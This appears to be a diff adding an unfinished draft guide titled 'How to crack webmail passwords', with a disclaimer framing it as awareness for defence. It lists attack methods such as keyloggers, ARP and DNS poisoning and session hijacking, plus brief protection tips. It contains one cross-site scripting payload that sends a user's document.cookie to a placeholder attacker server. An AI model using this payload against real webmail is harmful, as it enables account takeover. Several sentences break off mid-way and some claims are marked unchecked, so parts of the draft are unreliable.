@@ -1,0 +1,71 @@
+Disclaimer
+----------
+Hacking is illegal. Don't do it.
+This information is here to show you what kind of attacks you might face, so you can better protect yourself.
+
+
+
+I know about some of this stuff from actually trying it in a "lab" environment, but most is just from general knowledge of how things work. Note: you learn about 1000x more actually trying the attacks than just theoreticising, but it is really hard work.
+
+
+How to crack webmail passwords
+
+
+There is an important distinction here between resetting a forgotten password and breaking some else's account. To break an account, you just need to capture the password in transit or hijack a session. Whereas if the password is forgotten, you need to do a full-blown break-in.
+
+Capturing the password in transit
+---------------------------------
+
+Key logger
+A key logger sits on a computer and records all the key
+
+  social engineering --> more on that later because we are "just sat waiting for a login"
+
+Trojan key logger
+  or even active attack
+
+--
+Tcpdump
+  session hijack
+  Password crackers
+  Replay attack <--- actually timestamp prevents this well!
+      should use javascript to refresh login page so we don't miss the timeout
+ARP poisoning
+
+DNS cache poisoning
+If you pull this off, you are pretty "1337" :-)
+
+BGP poisoning
+
+Protecting yourself
+SSL protects against *ALL* these network based attacks. However, you mustn't blindly click "yes" to this:
+
+If you do that, you throw away your high-grade encryption in a single click.
+
+Session hijack
+--------------
+
+Cross-site scripting
+The idea of a cross-site scripting attack is to find a way to inject your own javascript code into a webmail page. The simplest way would be to try just embeding it in an email. You would want to embed something like:
+<blockquote><code>&lt;script language=javascript&gt;window.open('http://your.server/script.cgi?cookie='+document.cookie)&lt;/script&gt;</code></blockquote>
+This would deliver the user's login cookie to you. There are usually no IP address restrictions (I think -- CHECK!!!!!!) so then you can just take over their login session, without them even noticing.
+
+Of course, that simple approach won't work, because the webmail system will filter the input (TBD: exactly how!!!). But there are two things to look for: really odd input combinations that bypass the protection, and obscure, little-used fields that might have been forgotten. There are a number of tools available that automatically scan for such vulnerabilities in web applications. They can also occour
+
+Protecting yourself
+Many cross-site scripting attacks will cause odd browser behaviour, or require you to click on odd-looking links. So be vigilant!
+
+Note: SSL provides absolutely zero protection against cross-site scripting!!! The cookie just jumps through 1024-bit RSA encryption.
+
+
+Forgotten password
+------------------
+Let me say now, unless so are "uber" beyond what I can imagine, so stand a very small chance of success here. Regardless...
+
+SQL injection
+script injection
+buffer overflow
+scanning for vulns
+
+logic error
+if you discover one of these you have hit jackpot. one was discovered in microsoft passport
